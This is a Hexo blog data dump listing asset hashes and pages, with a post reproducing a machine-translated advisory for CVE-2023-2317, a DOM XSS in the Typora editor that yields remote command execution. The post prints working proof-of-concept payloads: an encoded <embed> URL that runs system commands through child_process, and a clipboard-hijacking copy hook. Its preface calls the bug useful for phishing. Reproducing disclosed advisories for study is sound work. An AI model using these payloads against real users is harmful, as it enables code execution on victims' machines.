92","modified":1692249997000},{"_id":"themes/obsidian/source/js/jquery.min.js","hash":"3f1b0e9e54af1af2db2c8a639530448723462151","modified":1692249997000},{"_id":"themes/obsidian/source/aplayer/dist/APlayer.js","hash":"484f100a6548d181a27fe32cfcdc9a1a548c10bc","modified":1692249997000},{"_id":"themes/obsidian/source/img/cover.jpg","hash":"b977716eb4569f06ae41747c92121d44dd0ef2ec","modified":1692249997000},{"_id":"themes/obsidian/source/aplayer/dist/APlayer.min.js.map","hash":"31a19da0f0cb6b00ec212eafa847f31af86788df","modified":1692249997000},{"_id":"themes/obsidian/source/aplayer/yarn.lock","hash":"8dbed195fe8209e26307a9bde9cd99b5e38d0395","modified":1692249997000},{"_id":"themes/obsidian/source/img/welcome-cover.jpg","hash":"4f64859e7d800f527944aab1615ecc4e24467f50","modified":1692249997000},{"_id":"themes/obsidian/source/img/profile.jpg","hash":"f039e298bfe68f8edeaa2f3bf90a118852588e4e","modified":1692249997000},{"_id":"themes/obsidian/source/img/tou.png","hash":"f47e476d50fd0a1759c2c6f1922b431ca7a0fbd1","modified":1692545064732},{"_id":"themes/obsidian/source/statics/chengdu.mp3","hash":"ffff18953f07760d1e30a74e22eee49f1f7f793f","modified":1692249997000},{"_id":"public/search.xml","hash":"bd6bc582de78566f414dec3979ea73753a6a8bce","modified":1693460961507},{"_id":"public/tags/index.html","hash":"195ae8572148c8a942a6207cad7bab9504043343","modified":1693460961507},{"_id":"public/categories/index.html","hash":"44a051872196667a76fa5fde399926031aa5b826","modified":1693460961507},{"_id":"public/about/index.html","hash":"68e6ee347142a06b4907d921ac5d9c4040bd9f3a","modified":1693460961507},{"_id":"public/2023/08/22/博客更新/index.html","hash":"9f2a7f373cba2a7801c8251f30fa53f1912e5a17","modified":1693460961507},{"_id":"public/2023/08/22/日记/index.html","hash":"1dd5d8c1849a8562d8804a0f18d59ea79c478afd","modified":1693460961507},{"_id":"public/2023/08/20/My-First-Post/index.html","hash":"740980d4d82659e9cefd967d44578ffea5b9114a","modified":1693460961507},{"_id":"public/categories/渗透测试/index.html","hash":"b0c1805729bb1cd89b92c93040106596cb62d07a","modified":1693460961507},{"_id":"public/tags/复现/index.html","hash":"6ba2a26e5367bfe51e8bda16079718d33e0721dc","modified":1693460961507},{"_id":"public/tags/hello/index.html","hash":"e3fa0ea8047cf84a629b6681c8c4518ca67a6c19","modified":1693460961507},{"_id":"public/tags/writeup/index.html","hash":"498cfc4da1ec2383e641ec3c184a5ca874dfcf70","modified":1693460961507},{"_id":"public/tags/web/index.html","hash":"1a51c43f9c8a1e6901881cafb8444bdce5b1bc19","modified":1693460961507},{"_id":"public/tags/渗透测试/index.html","hash":"1d2660703a00378a00d670d0fb83adb8db00cba1","modified":1693460961507},{"_id":"public/tags/入门/index.html","hash":"07022d5697fe592c7c455813e43712d39c17539d","modified":1693460961507},{"_id":"public/tags/流量分析/index.html","hash":"9d89f3aa1eed79d05b0588f28d95e727de2ba063","modified":1693460961507},{"_id":"public/2023/08/30/CVE-2023-2317(typora远程命令执行)复现/index.html","hash":"85fe0ab5ecda12818e1ec2b79c4fbce5ecf92815","modified":1693460961507},{"_id":"public/2023/08/24/陇剑杯 2021 misc 简单日志分析/index.html","hash":"4b0b84d9cf9f76134757418aad4b5ed75d5d97ab","modified":1693460961507},{"_id":"public/2023/08/24/陇剑杯 2021 misc 日志分析/index.html","hash":"b77a0939dde3e11d18aa44c1487ddd5cd8f4dba7","modified":1693460961507},{"_id":"public/2023/08/23/陇剑杯 2021 misc webshell/index.html","hash":"04eaf02546a4371e27543c79db51d0229aa59573","modified":1693460961507},{"_id":"public/2023/08/22/sharkctf_2023/index.html","hash":"49109d1fe89a52d712ca9ab7b0941dc19e599f1a","modified":1693460961507},{"_id":"public/2023/08/20/渗透测试入门/index.html","hash":"65c39dc00c5f9be1fb76c3fcf087b69b0ed7bbf8","modified":1693460961507},{"_id":"public/2023/08/20/hello-world/index.html","hash":"603de902278a9bd1129d97236c1979bf62a86743","modified":1693460961507},{"_id":"public/archives/index.html","hash":"88d98fa3cf5c5fe83056dee5dfeed92fc0e84b61","modified":1693460961507},{"_id":"public/archives/2023/index.html","hash":"1c210746a13b2371663d6503cdc832f7eb30eb64","modified":1693460961507},{"_id":"public/archives/2023/08/index.html","hash":"bf0558561a61adc66b851613d4d19bcf691448ed","modified":1693460961507},{"_id":"public/categories/Diary/index.html","hash":"30d6e61407bbd6780cce8bfb90fa1480f706b3fd","modified":1693460961507},{"_id":"public/categories/ctf/index.html","hash":"3c82671239a1ce7a6a7d3e2054239206aa13ba64","modified":1693460961507},{"_id":"public/categories/ctf/writeup/index.html","hash":"5e827c19062b2f8794b006b65f5b580926354693","modified":1693460961507},{"_id":"public/index.html","hash":"2ae7d07812aa5f8d9004519746ac005c1bd67f5d","modified":1693460961507},{"_id":"public/tags/blog/index.html","hash":"acc55f519b7d91f638133c3844c7ed821fb3bbe2","modified":1693460961507},{"_id":"public/tags/misc/index.html","hash":"37ae5b203292ec0b257724e560c1e0812143efc4","modified":1693460961507},{"_id":"public/tags/日志分析/index.html","hash":"ebb931a2eb704597d50b38f7e23a69b4dc7fbe50","modified":1693460961507},{"_id":"public/font/Rubik-Bold-kern-latin.woff2","hash":"5ffc50abee67c11cfe7c174e6407119dda79bffe","modified":1693460961507},{"_id":"public/aplayer/LICENSE","hash":"ae26f1f8ac172c3e6daf6a62e7e407e9b5221fac","modified":1693460961507},{"_id":"public/img/favicon.png","hash":"763e5dd543412266eb38bb66d1e2ed79391c75b6","modified":1693460961507},{"_id":"public/img/logo.png","hash":"6bede3c44d4d39fac890a4c48e9d4250d228106c","modified":1693460961507},{"_id":"public/img/logo_icon.png","hash":"763e5dd543412266eb38bb66d1e2ed79391c75b6","modified":1693460961507},{"_id":"public/font/Rubik-Regular-kern-latin.woff2","hash":"f6220f2824efbdb57afe2165886aa7e8ca9345b3","modified":1693460961507},{"_id":"public/aplayer/dist/APlayer.min.css.map","hash":"c59d2bc9472922cf6ef9a99e052dbee6cc7e6b36","modified":1693460961507},{"_id":"public/aplayer/src/assets/loading.svg","hash":"a032e15f65605ebea9d61de5a741f836b3ff5c21","modified":1693460961507},{"_id":"public/aplayer/src/assets/lrc.svg","hash":"1f0eebc00c99da25332a4bdcb3fd7b770c59a709","modified":1693460961507},{"_id":"public/aplayer/src/assets/loop-one.svg","hash":"221b3e24dae19a5dc023d9ab00253fb754b5b389","modified":1693460961507},{"_id":"public/aplayer/src/assets/loop-none.svg","hash":"daf74504add716b8b32ed06df236c8ab35c15faf","modified":1693460961507},{"_id":"public/aplayer/src/assets/menu.svg","hash":"5b37ffd6adba91c42daf63a8232f2b180dcc9e49","modified":1693460961507},{"_id":"public/aplayer/src/assets/loop-all.svg","hash":"d15f558bca9675cee9eacdbc2d1125907f6cf22f","modified":1693460961507},{"_id":"public/aplayer/src/assets/pause.svg","hash":"4fc55cadd15cc6cc053b0b327f1ba72692e234d7","modified":1693460961507},{"_id":"public/aplayer/src/assets/order-list.svg","hash":"d9762f52daa5da7489279bca269f86ef82100e59","modified":1693460961507},{"_id":"public/aplayer/src/assets/order-random.svg","hash":"e8328fc87b99c6bc6ed2c89cfa260dc6b1628af0","modified":1693460961507},{"_id":"public/aplayer/src/assets/right.svg","hash":"d9e8211c2f4783bd69d3871330db4facb4a6780f","modified":1693460961507},{"_id":"public/aplayer/src/assets/play.svg","hash":"f36398bb91f986da148f7157316f4ceaa2b42beb","modified":1693460961507},{"_id":"public/aplayer/src/assets/skip.svg","hash":"5635ae52738c79b3a65e3184784bd78bc5af7b26","modified":1693460961507},{"_id":"public/aplayer/src/assets/volume-off.svg","hash":"5c8b6b0acf02070216ccaa5bdf27f05758e1033d","modified":1693460961507},{"_id":"public/aplayer/src/assets/volume-down.svg","hash":"0fe1d0f49f3ecb87584fb9ce28c55c715d3b2dfe","modified":1693460961507},{"_id":"public/aplayer/src/template/list-item.art","hash":"e61626368b30154183f8853c69405ab269e46d0b","modified":1693460961507},{"_id":"public/aplayer/src/css/index.scss","hash":"cc4c34c197667439e7ca924cc0c45d44d505adf4","modified":1693460961507},{"_id":"public/aplayer/src/template/lrc.art","hash":"f9bd888397d0f972f8c764797fb9354cebeafafc","modified":1693460961507},{"_id":"public/aplayer/src/assets/volume-up.svg","hash":"2d6979f5cb874ab5d14e3c0bea4e0dc40799d83a","modified":1693460961507},{"_id":"public/aplayer/src/template/player.art","hash":"64edf17aa5b21193d051a6170c6c935ca94526ad","modified":1693460961507},{"_id":"public/aplayer/README.html","hash":"4e62891fbbd329c967ec08763bb32f34465e4849","modified":1693460961507},{"_id":"public/aplayer/package.json","hash":"72085f63e6199b8dc0dfaa05610b63e397bd1f43","modified":1693460961507},{"_id":"public/css/theme.css","hash":"0e5c3bdd7b08931209c816eab93ab1b62554d609","modified":1693460961507},{"_id":"public/css/codemirror.css","hash":"d45967fa2b7e701c3d0dd62cdce0385f5c8f6961","modified":1693460961507},{"_id":"public/css/ball-atom.min.css","hash":"c226472e3b8f09c1a30c55a4e1575fc2b22bd4a5","modified":1693460961507},{"_id":"public/js/Meting.min.js","hash":"be49f061c76145ba818a7e20b4b4515131bba32b","modified":1693460961507},{"_id":"public/js/busuanzi.min.js","hash":"c31e1244ea9c6da70f306b76ea0c001486e4ea78","modified":1693460961507},{"_id":"public/js/busuanzi.js","hash":"8148df0753f8fdcddb306dc36003a6a636b44691","modified":1693460961507},{"_id":"public/js/jquery.truncate.js","hash":"9bfb5e6e567458aff86e0cc4bc8c53917387ce13","modified":1693460961507},{"_id":"public/js/jquery.truncate.min.js","hash":"a71f558be59d47c2e896bea46e605eb93aa26786","modified":1693460961507},{"_id":"public/js/loadaplayer.js","hash":"ec86aeb41463c3ee8602d08b21df1c7ec97ddfa1","modified":1693460961507},{"_id":"public/js/obsidian.min.js","hash":"609c0f9fe552687d3d4bca1f58da8bc603911410","modified":1693460961507},{"_id":"public/js/search.js","hash":"7dd6ada071decde02737645143d217906fe3fe80","modified":1693460961507},{"_id":"public/aplayer/demo/demo.js","hash":"b8f47c0c112b54e068cfabbac07a6c65f4aa4907","modified":1693460961507},{"_id":"public/aplayer/demo/index.html","hash":"0c4317d84bbf6a22aeda24657d806cd222225a2b","modified":1693460961507},{"_id":"public/aplayer/dist/APlayer.min.css","hash":"e0702acfbbe02aa08af77ff55102ef4c80dde105","modified":1693460961507},{"_id":"public/aplayer/docs/config.js","hash":"781bf27b5073314aac6992e2bacf75783cd36f01","modified":1693460961507},{"_id":"public/aplayer/docs/ecosystem.html","hash":"32e445002b6d388162ca2cd9863a543d52871efd","modified":1693460961507},{"_id":"public/aplayer/docs/index.html","hash":"94506337e896d818c0f0a4589a03d150287284c1","modified":1693460961507},{"_id":"public/aplayer/docs/landing.html","hash":"c3a5f4259529e7a42edbe3da17a4571c70b0d1a6","modified":1693460961507},{"_id":"public/aplayer/docs/support.html","hash":"fb556985584b8158e4fb9635f0649b0bf9f50280","modified":1693460961507},{"_id":"public/aplayer/webpack/dev.config.js","hash":"38486bc2e2a2e072b29f95eb049e4191b312c09e","modified":1693460961507},{"_id":"public/aplayer/webpack/prod.config.js","hash":"e8a8f69b91c0deb4ae6f88f40d1e495f9212236e","modified":1693460961507},{"_id":"public/aplayer/docs/zh-Hans/ecosystem.html","hash":"4834ab5017e273fbc333adfca573cdf15d3fb8ce","modified":1693460961507},{"_id":"public/aplayer/docs/zh-Hans/support.html","hash":"b4876ccccbed564b312013ab292c2a7c51a94abe","modified":1693460961507},{"_id":"public/aplayer/src/js/bar.js","hash":"f530658a6b2f221e624546b763b1056de7adf2e5","modified":1693460961507},{"_id":"public/aplayer/src/js/events.js","hash":"58cc17514767d6a79f14eff6c6eb75549cff54bc","modified":1693460961507},{"_id":"public/aplayer/src/js/controller.js","hash":"a1fa5f1be74a9080abf8c266de52479e1f4fe662","modified":1693460961507},{"_id":"public/aplayer/src/js/icons.js","hash":"b34136ffdbfe9861081eb8aaeda6331679340f0d","modified":1693460961507},{"_id":"public/aplayer/src/js/index.js","hash":"4b445a3e4b0183fbdbec92e1ad989b9ce05ce502","modified":1693460961507},{"_id":"public/aplayer/src/js/list.js","hash":"af64cfa133ffa2eb67425094a3e5a5ae4b2320ef","modified":1693460961507},{"_id":"public/aplayer/src/js/lrc.js","hash":"f843a16621bc204d16ae97e579fa10be89b2d76a","modified":1693460961507},{"_id":"public/aplayer/src/js/player.js","hash":"3c3e4e2806a376d65dc576eab66e020c188717af","modified":1693460961507},{"_id":"public/aplayer/src/js/options.js","hash":"4b343773b511d73520a32082b66422278a1ab136","modified":1693460961507},{"_id":"public/aplayer/src/js/storage.js","hash":"1a70813959ac37e55337958466185e0177d5dcba","modified":1693460961507},{"_id":"public/aplayer/src/js/template.js","hash":"10b534c119eca0a69628d57be0f7ff320700b48b","modified":1693460961507},{"_id":"public/aplayer/src/js/utils.js","hash":"9d4829298ffbca25657d1a1ff2eb140f91e7fa6e","modified":1693460961507},{"_id":"public/aplayer/src/js/timer.js","hash":"4681c42cf8014b35141dbe827dd0578862a1c56a","modified":1693460961507},{"_id":"public/js/jquery.min.js","hash":"3f1b0e9e54af1af2db2c8a639530448723462151","modified":1693460961507},{"_id":"public/css/obsidian.css","hash":"62822bfbc85e79250f4aef143e04dd5bc89b3ec9","modified":1693460961507},{"_id":"public/js/obsidian.js","hash":"b3595121977c127598f9108316eeaae491521a18","modified":1693460961507},{"_id":"public/js/plugin.js","hash":"0ac6bf36a9a11ca6fad0af1f20e5705bc326abf4","modified":1693460961507},{"_id":"public/aplayer/docs/README.html","hash":"e0ba677af1e0852d73dcdb437d9d85960705a04c","modified":1693460961507},{"_id":"public/aplayer/dist/APlayer.js","hash":"484f100a6548d181a27fe32cfcdc9a1a548c10bc","modified":1693460961507},{"_id":"public/aplayer/dist/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1693460961507},{"_id":"public/aplayer/docs/zh-Hans/README.html","hash":"e86101eb1d829c2096a2ea83658568390d20bb02","modified":1693460961507},{"_id":"public/img/cover.jpg","hash":"b977716eb4569f06ae41747c92121d44dd0ef2ec","modified":1693460961507},{"_id":"public/aplayer/dist/APlayer.min.js.map","hash":"31a19da0f0cb6b00ec212eafa847f31af86788df","modified":1693460961507},{"_id":"public/aplayer/yarn.lock","hash":"8dbed195fe8209e26307a9bde9cd99b5e38d0395","modified":1693460961507},{"_id":"public/img/welcome-cover.jpg","hash":"4f64859e7d800f527944aab1615ecc4e24467f50","modified":1693460961507},{"_id":"public/img/profile.jpg","hash":"f039e298bfe68f8edeaa2f3bf90a118852588e4e","modified":1693460961507},{"_id":"public/img/tou.png","hash":"f47e476d50fd0a1759c2c6f1922b431ca7a0fbd1","modified":1693460961507},{"_id":"public/statics/chengdu.mp3","hash":"ffff18953f07760d1e30a74e22eee49f1f7f793f","modified":1693460961507}],"Category":[{"name":"Diary","_id":"cllyqxkza00071ao5b5d65e4s"},{"name":"ctf","_id":"cllyqxkzd000d1ao5e6y016yx"},{"name":"渗透测试","_id":"cllyqxkze000i1ao589dl1kdg"},{"name":"writeup","parent":"cllyqxkzd000d1ao5e6y016yx","_id":"cllyqxkzg000p1ao54nbj9qg8"}],"Data":[],"Page":[{"title":"tags","date":"2023-08-20T08:15:13.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2023-08-20 16:15:13\ntype: 'tags'\n---\n","updated":"2023-08-20T11:01:08.482Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cllyqxkz000001ao5a85226vs","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2023-08-20T08:01:20.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2023-08-20 16:01:20\ntype: 'categories'\n---\n","updated":"2023-08-20T08:07:03.091Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cllyqxkz600021ao53q6ncci7","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2023-08-20T11:05:49.000Z","type":"about","_content":"\n---\n### `Who am I`\nWelcome to my blog, I am <b style=\"color: #0ed2f7\"><strong>glan</strong></b>\n\n\n欢迎来到我的博客, 我是  <b style=\"color: #0ed2f7\"><strong>glan</strong></b> ,  \n\n\n热爱户外旅游和接受挑战，生活和工作平衡，有节奏感的人生。\n\n---\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2023-08-20 19:05:49\ntype: 'about'\n---\n\n---\n### `Who am I`\nWelcome to my blog, I am <b style=\"color: #0ed2f7\"><strong>glan</strong></b>\n\n\n欢迎来到我的博客, 我是  <b style=\"color: #0ed2f7\"><strong>glan</strong></b> ,  \n\n\n热爱户外旅游和接受挑战，生活和工作平衡，有节奏感的人生。\n\n---\n","updated":"2023-08-20T12:53:18.462Z","path":"about/index.html","comments":1,"layout":"page","_id":"cllyqxkz800051ao57wap3jtm","content":"<hr>\n<h3 id=\"Who-am-I\"><a href=\"#Who-am-I\" class=\"headerlink\" title=\"Who am I\"></a><code>Who am I</code></h3><p>Welcome to my blog, I am <b style=\"color: #0ed2f7\"><strong>glan</strong></b></p>\n<p>欢迎来到我的博客, 我是  <b style=\"color: #0ed2f7\"><strong>glan</strong></b> ,  </p>\n<p>热爱户外旅游和接受挑战，生活和工作平衡，有节奏感的人生。</p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<hr>\n<h3 id=\"Who-am-I\"><a href=\"#Who-am-I\" class=\"headerlink\" title=\"Who am I\"></a><code>Who am I</code></h3><p>Welcome to my blog, I am <b style=\"color: #0ed2f7\"><strong>glan</strong></b></p>\n<p>欢迎来到我的博客, 我是  <b style=\"color: #0ed2f7\"><strong>glan</strong></b> ,  </p>\n<p>热爱户外旅游和接受挑战，生活和工作平衡，有节奏感的人生。</p>\n<hr>\n"}],"Post":[{"title":"CVE-2023-2317(typora远程命令执行)复现","date":"2023-08-30T12:58:05.000Z","_content":"## <a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a>\n\n\n> 以下为机翻，发布用以个人学习方便之需。\n> 此漏洞在钓鱼、反制等领域都有一定意义。\n\n\n## 产品概述：\n\nTypora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。\n\n适用于 Windows/Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。\n\n\n## 漏洞摘要:\n\nWindows/Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。\n\n\n## 漏洞详细信息：\n\n已在以下位置发现基于 DOM 的 XSS `Typora/resources/updater/updater.html`：\n\n```html\n    <div class=\"btn-group\">\n      <div id=\"skip-this-version-btn-group\" style=\"flex-grow: 2; min-height: 10px;min-width: 10px;\">\n        <button onClick=\"onSkipUpdate()\" data-label=\"1\" >Skip This Version</button>\n      </div>\n      \n      <button onClick=\"onCancelUpdate()\" data-label=\"2\" >Remind Me Later</button>\n      <button class=\"btn-primary\" onClick=\"onDownloadUpdate()\" data-label=\"3\" >Download Update</button>\n    </div>\n\n    <script type=\"text/javascript\">\n      // ...\n      var labels = JSON.parse(decodeURIComponent(/[?&]labels=([^&]+)/.exec(window.location.search)[1]));        // [1]\n\n      document.querySelector(\"#sum\").innerText = labels[4] + \" \" + labels[5].replace(\"$1\", newVersion).replace(\"$2\", curVersion);\n      document.querySelectorAll(\"[data-label]\").forEach(function(dom){\n        dom.innerHTML = labels[dom.getAttribute(\"data-label\") - 0];     // [2]\n      });\n      // ...\n    </script>\n```\n\n在上面的代码片段中，变量`labels`是从`location.search`at中提取的`[1]`，然后分配给具有at 属性的`innerHTML`元素。`data-label``[2]`\n\n这是一个将`<input>`标签注入 DOM 的 PoC：\n\n```\nupdater.html?curVersion=1&newVersion=2&releaseNoteLink=3&hideAutoUpdates=false&labels=[\"<input%20value=test>\",\"22\",\"33\",\"44\",\"55\",\"66\",\"77\"]\n```\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png)\n\nTypora 注册了一个文件处理程序`typora://`来加载本地资源。例如，主窗口的 URL 是`typora://app/typemark/window.html`，实际文件是从 加载的`[Typora Installation Absolute Path]/resources/window.html`。\n\n攻击者可以`<embed>`通过将`src`属性设置为 来将存在漏洞的 updater.html 加载到标签内`typora://app/typemark/updater/updater.html`。在这种情况下，`typora://app/typemark/window.html`在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如`reqnode`.\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png)\n\n通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用`reqnode`主窗口中的特权界面来访问节点模块`child_process`并执行任意系统命令。\n\n\n## 利用条件：\n\n可以通过诱使受害者\n1.  在 Typora 中打开恶意 Markdown 文件\n2.  从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。\n\n\n## POC:\n我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：\n\n```html\n<embed src=\"typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]\"></embed>\n```\n\nPoC中的base64编码部分被解码为以下内容：\n\n```javascript\nreqnode('child_process').exec(({Win32: 'notepad %WINDIR%/win.ini', Linux: 'gnome-calculator -e \"Typora RCE PoC\"'})[navigator.platform.substr(0,5)])\n```\n\n当这个 PoC 加载到 Typora 中时，它将：\n\n1. 使用 DOM-XSS 负载加载 updater.html\n2. 有效负载在主窗口上执行 JavaScript 代码\n3. 执行系统命令：`notepad`在Windows上，或`gnome-calculator`在Linux上\n\n\n## 攻击场景：\n\n### 场景一：打开恶意markdown文件\n\n攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。\n\n我们附上`poc/typora-1.5.12-rce.md`这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。\n\n以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif)\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif)\n\n### 场景 2：从网页复制并粘贴\n\n`copy`攻击者可以制作恶意网页并使用以下代码来挂钩该事件：\n\n```html\n<script>\n    document.addEventListener('copy',e=>{\n        e.preventDefault();\n        let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7');\n        e.clipboardData.setData('text/markhtml', `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection());\n        console.log(payload + window.getSelection())\n    })\n</script>\n```\n\n当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif)\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif)\n\n我们已附上`poc/rce-cp.html`此场景的 PoC。[现场版本也可以在这里](https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html)找到。\n\n### 补充笔记：\n\n1. 攻击者可以在`<embed>`标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，`height:0;`在场景2 PoC中用于隐藏嵌入的网页。\n\n## 建议的缓解措施：\n\n建议通过设置`innerText`而不是 来更新 HTML 元素`innerHTML`。\n\n对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。\n\n\n## 经典复现：\nwindows改成了弹计算器版本。\n\n```html\n<embed src=\"typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]\"></embed>\n```\n\n\n\n\n","source":"_posts/CVE-2023-2317(typora远程命令执行)复现.md","raw":"---\ntitle: CVE-2023-2317(typora远程命令执行)复现\ndate: 2023-08-30 20:58:05\ntags:\n- 复现\n---\n## <a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a>\n\n\n> 以下为机翻，发布用以个人学习方便之需。\n> 此漏洞在钓鱼、反制等领域都有一定意义。\n\n\n## 产品概述：\n\nTypora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。\n\n适用于 Windows/Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。\n\n\n## 漏洞摘要:\n\nWindows/Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。\n\n\n## 漏洞详细信息：\n\n已在以下位置发现基于 DOM 的 XSS `Typora/resources/updater/updater.html`：\n\n```html\n    <div class=\"btn-group\">\n      <div id=\"skip-this-version-btn-group\" style=\"flex-grow: 2; min-height: 10px;min-width: 10px;\">\n        <button onClick=\"onSkipUpdate()\" data-label=\"1\" >Skip This Version</button>\n      </div>\n      \n      <button onClick=\"onCancelUpdate()\" data-label=\"2\" >Remind Me Later</button>\n      <button class=\"btn-primary\" onClick=\"onDownloadUpdate()\" data-label=\"3\" >Download Update</button>\n    </div>\n\n    <script type=\"text/javascript\">\n      // ...\n      var labels = JSON.parse(decodeURIComponent(/[?&]labels=([^&]+)/.exec(window.location.search)[1]));        // [1]\n\n      document.querySelector(\"#sum\").innerText = labels[4] + \" \" + labels[5].replace(\"$1\", newVersion).replace(\"$2\", curVersion);\n      document.querySelectorAll(\"[data-label]\").forEach(function(dom){\n        dom.innerHTML = labels[dom.getAttribute(\"data-label\") - 0];     // [2]\n      });\n      // ...\n    </script>\n```\n\n在上面的代码片段中，变量`labels`是从`location.search`at中提取的`[1]`，然后分配给具有at 属性的`innerHTML`元素。`data-label``[2]`\n\n这是一个将`<input>`标签注入 DOM 的 PoC：\n\n```\nupdater.html?curVersion=1&newVersion=2&releaseNoteLink=3&hideAutoUpdates=false&labels=[\"<input%20value=test>\",\"22\",\"33\",\"44\",\"55\",\"66\",\"77\"]\n```\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png)\n\nTypora 注册了一个文件处理程序`typora://`来加载本地资源。例如，主窗口的 URL 是`typora://app/typemark/window.html`，实际文件是从 加载的`[Typora Installation Absolute Path]/resources/window.html`。\n\n攻击者可以`<embed>`通过将`src`属性设置为 来将存在漏洞的 updater.html 